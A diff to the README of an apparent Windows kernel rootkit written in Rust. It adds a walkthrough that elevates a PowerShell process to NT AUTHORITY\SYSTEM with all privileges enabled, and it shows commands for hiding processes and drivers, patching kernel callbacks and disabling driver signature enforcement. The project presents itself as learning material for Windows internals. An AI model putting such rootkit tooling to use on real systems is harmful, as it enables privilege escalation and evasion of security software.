@@ -3,7 +3,7 @@
 ## Features (Development in progress)
 
 * Protect / unprotect process (Done)
-* Elevate / remove token privileges (Done)
+* Elevate to NT AUTHORITY\\SYSTEM and Enable all token privileges (Done)
 * Hide process (Done)
 * Hide driver (Done)
 * Enumerate loaded kernel modules (Done)
@@ -90,7 +90,7 @@ OPTIONS:
         --hide         Hide a driver using Direct Kernel Object Manipulation (DKOM)
 ```
 
-## Example 1: Enumerate and patch kernel callbacks
+## Enumerate and Patch Kernel Callbacks
 
 ```
 PS C:\Users\memn0ps\Desktop> .\client.exe callbacks --enumerate
@@ -128,23 +128,128 @@ Total Kernel Callbacks: 10
 [9] 0xffffbd8d3f97104f ("peauth.sys")
 ```
 
-## Example 2: Protect a process and elevate token privileges
-
-![Default](./notepad_default.png)
+## Protect Process
 
 ```
 PS C:\Users\memn0ps\Desktop> .\client.exe process --name notepad.exe --protect
 [+] Process protected successfully 8248
-
-PS C:\Users\memn0ps\Desktop> .\client.exe process --name notepad.exe --elevate
-[+] Tokens privileges elevated successfully 8248
 ```
 
 ![Protect](./notepad_protect.png)
 
-![Elevate](./notepad_elevate.png)
+## Elevate to NT AUTHORITY\\System and Enable All Token Privileges
 
-## Example 3: Enable / Disable Driver Signature Enforcement (DSE)
+```
+PS C:\Users\memn0ps\Desktop> whoami /all
+
+USER INFORMATION
+
+================== ==============================================
+windows-10-vm\user S-1-5-21-3694103140-4081734440-3706941413-1001
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID          Attributes
+============================================================= ================ ============ ==================================================
+Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
+BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
+BUILTIN\Performance Log Users                                 Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+```
+
+```
+PS C:\Users\memn0ps\Desktop> .\client.exe process --name powershell.exe --elevate
+[+] Tokens privileges elevated successfully 6376
+```
+
+```
+PS C:\Users\memn0ps\Desktop> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ========
+nt authority\system S-1-5-18
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes
+====================================== ================ ============ ==================================================
+BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\System Mandatory Level Label            S-1-16-16384
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeCreateTokenPrivilege                    Create a token object                                              Enabled
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeAuditPrivilege                          Generate security audits                                           Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeTrustedCredManAccessPrivilege           Access Credential Manager as a trusted caller                      Enabled
+SeRelabelPrivilege                        Modify an object label                                             Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+
+PS C:\Users\memn0ps\Desktop>
+```
+
+
+
+## Enable / Disable Driver Signature Enforcement (DSE)
 
 ```
 PS C:\Users\memn0ps\Desktop> .\client.exe dse --enable
@@ -167,7 +272,7 @@ Bytes returned: 16
 fffff800`5a6683b8  0e
 ```
 
-## Example 4: Hide Process
+## Hide Process
 
 ![CMD](./cmd_hide1.png)
 
@@ -180,7 +285,7 @@ PS C:\Users\memn0ps\Desktop> .\client.exe process --name powershell.exe --hide
 ![CMD](./cmd_hide2.png)
 
 
-## Example 5: Hide Driver
+## Hide Driver
 
 Hidden from ZwQuerySystemInformation and PsLoadedModuleList
 
@@ -337,6 +442,7 @@ I made this project for fun and because I really like Rust and Windows Internals
 * https://courses.zeropointsecurity.co.uk/courses/offensive-driver-development (Big thanks to @_RastaMouse)
 * https://leanpub.com/windowskernelprogramming Windows Kernel Programming Book (Big thanks to Pavel Yosifovich @zodiacon)
 * https://www.amazon.com/Rootkits-Subverting-Windows-Greg-Hoglund/dp/0321294319 (Big thanks to Greg Hoglund and James Butler for Rootkits: Subverting the Windows Kernel Book)
+* https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/ (Big thanks to HackSysTeam)
 * https://codentium.com/guides/windows-dev/
 * https://github.com/StephanvanSchaik/windows-kernel-rs/
 * https://github.com/rmccrystal/kernel-rs
